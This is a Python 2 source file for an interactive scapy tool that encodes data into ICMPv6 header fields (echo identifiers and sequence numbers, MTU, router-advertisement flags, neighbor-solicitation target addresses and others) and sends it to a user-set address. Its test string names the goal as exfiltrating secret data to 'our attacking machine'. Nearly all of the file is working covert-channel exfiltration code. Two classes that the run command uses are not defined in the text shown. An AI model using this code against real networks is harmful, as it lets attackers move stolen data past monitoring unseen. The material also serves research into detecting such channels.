#!/usr/bin/python

import sys
import re, uuid
import os
import readline
from pprint import pprint
from commands import *
from scapy.all import *
from receiver import *
from bitstring import *

"""
This class is for testing all covert channels in one
"""
class AllCovertTests:

    def __init__(self, iface):
        self.dataToExfilt = ': this is the super secret data to exfiltrate to our attacking machine\n'        
        self.ipAddress = ''
        self.iface = iface
        self.name = 'AllCovertTests'
        self.fragmentation = False

    def startSystem(self):
        Commands.setAllCovertTestHistory()
        running = 1
        while running:
            readline.parse_and_bind("tab: complete")
            #we receive data from the keyboard                    
            command  = raw_input(self.name + ' >>')
            #help command
            if re.match('help', command):
                self.showHelp()
            #quit module command
            elif re.match('quit', command):
                running = 0
                Commands.setCovertChannelHistory()
            elif re.match('setAdr', command):
                self.ipAddress = re.sub('setAdr', ' ', command).lstrip()
                print 'setting Ip address: ' + self.ipAddress
            #toggle fragmentation
            elif re.match('frag', command):
                self.fragmentation = not self.fragmentation
                if self.fragmentation:
                    print 'fragmentation is active'
                else:
                    print 'fragmentation disabled'
            #execution of all tests
            elif re.match('exec', command):
                dest = DestinationUnreachableCovert(self.fragmentation)
                dest.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                dest.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                dest.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                #dest.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                big = PacketTooBigCovert(self.fragmentation)
                big.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                big.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                time = TimeExceededCovert(self.fragmentation)
                time.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                time.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                time.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                #time.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                param = ParameterProblemCovert(self.fragmentation)
                param.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                param.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                echoReq = EchoRequestCovert(self.fragmentation)
                echoReq.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                echoReq.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                echoReq.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                echoReq.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                echoRep = EchoReplyCovert(self.fragmentation)
                echoRep.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                echoRep.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                echoRep.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                echoRep.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                routerSol = RouterSolicitationCovert(self.fragmentation)
                routerSol.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                routerSol.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                routerAdv = RouterAdvertisementCovert(self.fragmentation)
                routerAdv.execModule(self.dataToExfilt, '', '', '', '', '', '', '', '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', self.dataToExfilt, '', '', '', '', '', '', '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', self.dataToExfilt, '', '', '', '', '', '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', self.dataToExfilt, '', '', '', '', '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', self.dataToExfilt, '', '', '', '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', '', self.dataToExfilt, '', '', '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', '', '', self.dataToExfilt, '', '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', '', '', '', self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', '', '', '', '', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', '', '', '', '', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', '', '', '', '', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                neighbSol = NeighborSolicitationCovert(self.fragmentation)
                neighbSol.execModule(self.dataToExfilt, '', '', self.iface, self.ipAddress)
                neighbSol.execModule('', self.dataToExfilt, '', self.iface, self.ipAddress)
                neighbSol.execModule('', '', self.dataToExfilt, self.iface, self.ipAddress)                
                neighbAdv = NeighborAdvertisementCovert(self.fragmentation)
                neighbAdv.execModule(self.dataToExfilt, '', '', '', '', '', self.iface, self.ipAddress)
                neighbAdv.execModule('', self.dataToExfilt, '', '', '', '', self.iface, self.ipAddress)
                neighbAdv.execModule('', '', self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                neighbAdv.execModule('', '', '', self.dataToExfilt, '', '', self.iface, self.ipAddress)                
                neighbAdv.execModule('', '', '', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                neighbAdv.execModule('', '', '', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                redirect = RedirectCovert(self.fragmentation)
                redirect.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                redirect.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                redirect.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                redirect.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                
            elif re.match('rec', command):
                HelperClass.receiver(self.iface, self.ipAddress)

    def showHelp(self):
        for entry in Help.getAllCovertTestHelp():
            print entry

class DestinationUnreachableCovert:
    
    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthLength = 1
        self.bandwidthUnused = 3
        self.bandwidthPayload = 8
        self.nameCode = 'Destination Unreachable code '
        self.nameLength = 'Destination Unreachable length '
        self.nameUnused = 'Destination Unreachable unused '
        self.namePayload = 'Destination Unreachable payload '
        
    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6DestUnreach(code=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6DestUnreach(code=chunk)/'xxxxxxxx']

    def buildPacketLength(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6DestUnreach(length=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6DestUnreach(length=chunk)/"xxxxxxxx"]

    def buildPacketUnused(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6DestUnreach(unused=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6DestUnreach(unused=chunk)/"xxxxxxxx"]

    def buildPacketPayload(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6DestUnreach()/str(chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6DestUnreach()/str(chunk)]
        
    def execModule(self, dataCode, dataLength, dataUnused, dataPayload, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        if dataLength:
            data = self.nameLength+dataLength
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthLength, self.nameLength)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketLength(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        if dataUnused:
            data = self.nameUnused+dataUnused
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthUnused, self.nameUnused)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketUnused(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        if dataPayload:
            data = self.namePayload+dataPayload
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPayload, self.namePayload)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketPayload(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)

        
class PacketTooBigCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthMtu = 4
        self.nameCode = 'Packet Too Big code '
        self.nameMtu = 'Packet Too Big MTU '
        
    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6PacketTooBig(code=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6PacketTooBig(code=chunk)/"xxxxxxxx"]

    def buildPacketMtu(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6PacketTooBig(mtu=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6PacketTooBig(mtu=chunk)/"xxxxxxxx"]
        
    def execModule(self, dataCode, dataMtu, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataMtu:
            data = self.nameMtu+dataMtu
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthMtu, self.nameMtu)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketMtu(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)            

class TimeExceededCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthLength = 1
        self.bandwidthUnused = 3
        self.bandwidthPayload = 8
        self.nameCode = 'Time Exceeded code '
        self.nameLength = 'Time Exceeded length '
        self.nameUnused = 'Time Exceeded unused '
        self.namePayload = 'Time Exceeded payload '

    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6TimeExceeded(code=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6TimeExceeded(code=chunk)/"xxxxxxxx"]

    def buildPacketLength(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6TimeExceeded(length=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6TimeExceeded(length=chunk)/"xxxxxxxx"]

    def buildPacketUnused(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6TimeExceeded(unused=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6TimeExceeded(unused=chunk)/"xxxxxxxx"]

    def buildPacketPayload(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6TimeExceeded()/str(chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6TimeExceeded()/str(chunk)]
        
    def execModule(self, dataCode, dataLength, dataUnused, dataPayload, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        if dataLength:
            data = self.nameLength+dataLength
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthLength, self.nameLength)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketLength(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        if dataUnused:
            data = self.nameUnused+dataUnused
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthUnused, self.nameUnused)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketUnused(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        if dataPayload:
            data = self.namePayload+dataPayload
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPayload, self.namePayload)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketPayload(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
            
class ParameterProblemCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthPointer = 4
        self.nameCode = 'Parameter Problem code '
        self.namePointer = 'Parameter Problem pointer '
        
    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ParamProblem(code=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ParamProblem(code=chunk)/"xxxxxxxx"]

    def buildPacketPointer(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ParamProblem(ptr=chunk)/"xxxxxxxx")
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ParamProblem(ptr=chunk)/"xxxxxxxx"]

    def execModule(self, dataCode, dataPointer, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataPointer:
            data = self.namePointer+dataPointer
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPointer, self.namePointer)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketPointer(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
                
        
class EchoRequestCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthId = 2
        self.bandwidthSeq = 2
        self.bandwidthData = 8
        self.nameCode = 'Echo Request code '
        self.nameId = 'Echo Request identifier '
        self.nameSeq = 'Echo Request sequence number '
        self.nameData = 'Echo Request data '

    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6EchoRequest(code=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6EchoRequest(code=chunk)]

    def buildPacketId(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6EchoRequest(id=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6EchoRequest(id=chunk)]

    def buildPacketSeq(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6EchoRequest(seq=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6EchoRequest(seq=chunk)]

    def buildPacketData(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6EchoRequest(data=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6EchoRequest(data=chunk)]

    def execModule(self, dataCode, dataId, dataSeq, dataData, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataId:
            data = self.nameId+dataId
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthId, self.nameId)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketId(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataSeq:
            data = self.nameSeq+dataSeq
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthSeq, self.nameSeq)
            for chunk in sendingBuffer:
                packetContainer= self.buildPacketSeq(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataData:
            data = self.nameData+dataData
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthData, self.nameData)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketData(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
                
        
class EchoReplyCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthId = 2
        self.bandwidthSeq = 2
        self.bandwidthData = 8
        self.nameCode = 'Echo Reply code '
        self.nameId = 'Echo Reply identifier '
        self.nameSeq = 'Echo Reply sequence number '
        self.nameData = 'Echo Reply data '

    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6EchoReply(code=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6EchoReply(code=chunk)]

    def buildPacketId(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6EchoReply(id=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6EchoReply(id=chunk)]

    def buildPacketSeq(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6EchoReply(seq=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6EchoReply(seq=chunk)]

    def buildPacketData(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6EchoReply(data=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6EchoReply(data=chunk)]

    def execModule(self, dataCode, dataId, dataSeq, dataData, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataId:
            data = self.nameId+dataId
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthId, self.nameId)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketId(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataSeq:
            data = self.nameSeq+dataSeq
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthSeq, self.nameSeq)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketSeq(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataData:
            data = self.nameData+dataData
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthData, self.nameData)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketData(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
            
        
class RouterSolicitationCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthRes = 4
        self.nameCode = 'Router Solicitation code '
        self.nameRes = 'Router Solicitation reserved '

    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RS(code=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RS(code=chunk)]

    def buildPacketRes(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RS(res=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RS(res=chunk)]
    
    def execModule(self, dataCode, dataRes, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketRes(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
                
        
class RouterAdvertisementCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthCurHopLimit = 1
        self.bandwidthM = 1
        self.bandwidthO = 1
        self.bandwidthH = 1
        self.bandwidthPrf = 1
        self.bandwidthP = 1
        self.bandwidthRes = 1
        self.bandwidthRouterLifeTime = 2
        self.bandwidthReachTime = 4
        self.bandwidthRetransTimer = 4
        self.nameCode = 'Router Advertisement code '
        self.nameCurHopLimit = 'Router Advertisement Cur Hop Limit '
        self.nameM = 'Router Advertisement M '
        self.nameO = 'Router Advertisement O '
        self.nameH = 'Router Advertisement H '
        self.namePrf = 'Router Advertisement Prf '
        self.nameP = 'Router Advertisement P '
        self.nameRes = 'Router Advertisement reserved '
        self.nameRouterLifeTime = 'Router Advertisement router life time '
        self.nameReachTime = 'Router Advertisement reachable time '
        self.nameRetransTimer = 'Router Advertisement retrans timer '

    #set routerlifetime for all, default is 1800 and the receiver is not happy
    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(code=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(code=chunk, routerlifetime=0)]

    def buildPacketCurHopLimit(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(chlim=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(chlim=chunk, routerlifetime=0)]

    def buildPacketM(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(code=1, M=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(code=1, M=chunk, routerlifetime=0)]

    def buildPacketO(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(code=2, O=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(code=2, O=chunk, routerlifetime=0)]

    def buildPacketH(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(code=3, H=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(code=3, H=chunk, routerlifetime=0)]

    def buildPacketPrf(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(code=4, prf=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(code=4, prf=chunk, routerlifetime=0)]

    def buildPacketP(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(code=5, P=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(code=5, P=chunk, routerlifetime=0)]
        
    def buildPacketRes(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(code=6, res=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(code=6, res=chunk, routerlifetime=0)]

    def buildPacketRouterLifeTime(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(routerlifetime=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(routerlifetime=chunk)]

    def buildPacketReachTime(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(reachabletime=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(reachabletime=chunk, routerlifetime=0)]

    def buildPacketRetransTimer(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_RA(retranstimer=chunk, routerlifetime=0))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_RA(retranstimer=chunk, routerlifetime=0)]
        
    def execModule(self, dataCode, dataChlim, dataM, dataO, dataH, dataPrf, dataP, dataRes, dataRouterLifeTime, dataReachTime, dataRetransTimer, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataChlim:
            data = self.nameCurHopLimit+dataChlim
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCurHopLimit, self.nameCurHopLimit)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCurHopLimit(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataM:
            data = self.nameM+dataM
            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthM, self.nameM)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketM(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataO:
            data = self.nameO+dataO
            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthO, self.nameO)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketO(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataH:
            data = self.nameH+dataH
            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthH, self.nameH)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketH(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataPrf:
            data = self.namePrf+dataPrf
            sendingBuffer = HelperClass.chunkPackets2Bit(data, self.bandwidthPrf, self.namePrf)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketPrf(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataP:
            data = self.nameP+dataP
            sendingBuffer = HelperClass.chunkPacketsBit(data, self.bandwidthP, self.nameP)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketP(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets2Bit(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketRes(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataRouterLifeTime:
            data = self.nameRouterLifeTime+dataRouterLifeTime
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRouterLifeTime, self.nameRouterLifeTime)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketRouterLifeTime(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataReachTime:
            data = self.nameReachTime+dataReachTime
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthReachTime, self.nameReachTime)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketReachTime(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataRetransTimer:
            data = self.nameRetransTimer+dataRetransTimer
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRetransTimer, self.nameRetransTimer)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketRetransTimer(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
                
        
class NeighborSolicitationCovert:

    def __init__(self, frag):
        self.fragmentation = frag
        self.bandwidthCode = 1
        self.bandwidthRes = 4
        self.bandwidthTargetAdr = 16
        self.nameCode = 'Neighbor Solicitation code '
        self.nameRes = 'Neighbor Solicitation reserved '
        self.nameTargetAdr = 'Neighbor Solicitation target address '

    def buildPacketCode(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NS(code=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NS(code=chunk)]

    def buildPacketRes(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NS(res=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NS(res=chunk)]

    def buildPacketTargetAdr(self, chunk, ipAdr):
        if self.fragmentation:
            return HelperClass.fragmentPacket(ipAdr, ICMPv6ND_NS(tgt=chunk))
        else:
            return [IPv6(dst=ipAdr)/ICMPv6ND_NS(tgt=chunk)]

    def execModule(self, dataCode, dataRes, dataTargetAdr, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketCode(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketRes(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)
        elif dataTargetAdr:
            data = self.nameTargetAdr+dataTargetAdr
            sendingBuffer = HelperClass.chunkPacketsToAddress(data, self.bandwidthTargetAdr, self.nameTargetAdr)
            for chunk in sendingBuffer:
                packetContainer = self.buildPacketTargetAdr(chunk, ipAdr)
                for packet in packetContainer:
                    send(packet, iface=exitIface, verbose=False)                

                
